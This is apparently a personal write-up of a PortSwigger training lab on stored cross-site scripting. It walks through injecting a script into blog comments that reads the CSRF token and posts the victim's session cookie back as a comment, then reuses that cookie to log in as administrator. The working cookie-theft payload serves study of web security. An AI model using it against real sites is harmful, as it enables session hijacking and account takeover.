# Exploiting cross-site scripting to steal cookies

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies), you'll learn: Exploiting cross-site scripting to steal cookies! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230074442.png)

**In the home page, we can view one of those posts:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230074502.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230074514.png)

And we can leave some comments.

**Let's try a simple XSS payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230074713.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230074733.png)

It indeed triggered!

**Now, let's try to inject JavaScript code that will automaticatly send a POST request to leave a comment, with the session cookie!**

However, in order to steal user's session cookie, we need:

- **Find the CSRF value:**

**To do so, I'll find all `<input>` tag that is the CSRF token:**
```js
document.getElementsByTagName('input')
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230081442.png)

The first `<input>` is the CSRF token.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230081511.png)

**Then, we need to extract it's value:**
```js
document.getElementsByTagName('input')[0].value
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230081553.png)

Got it!

- **Construct the final payload:**

```html
<script>
    // Wait the window is fully loaded, otherwise the CSRF token will be empty
    window.onload = function (){
        // Fetch CSRF token value
        var csrfToken = document.getElementsByTagName('input')[0].value;

        // Construct the require POST parameters
        var data = 'csrf=' + csrfToken + '&';
        data += 'postId=8&';
        data += 'comment=' + document.cookie + '&';
        data += 'name=XSS&';
        data += 'email=xss@xss.com&';
        data += 'website='

        // Send the victim's cookie
        fetch('https://0ae1002c03c1e617c057f97200fa00c7.web-security-academy.net/post/comment',
            {
                method: 'POST',
                mode: 'no-cors',
                body: data
            }
        )
    };
</script>
```

**Let's break it down:**

1. When the window is fully loaded, fetch victim's CSRF token value.
2. Variable `data` is to construct the require POST parameters, like `csrf`, `postId`, `comment`, `name`, `email`, and `website` (This could be empty). Most importantly, in the `comment` parameter, we also include victim's session cookie.
3. When eveything is ready, send a POST request to `/post/comment`, which will post a new comment, with all the `data`.

**Finally, let's send our well-crafted XSS payload!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230084453.png)

**Then refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230084509.png)

Boom! Got ya!

**Let's copy that session cookie and replace our session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-14/images/Pasted%20image%2020221230084700.png)

We're user `administrator`!

# What we've learned:

1. Exploiting cross-site scripting to steal cookies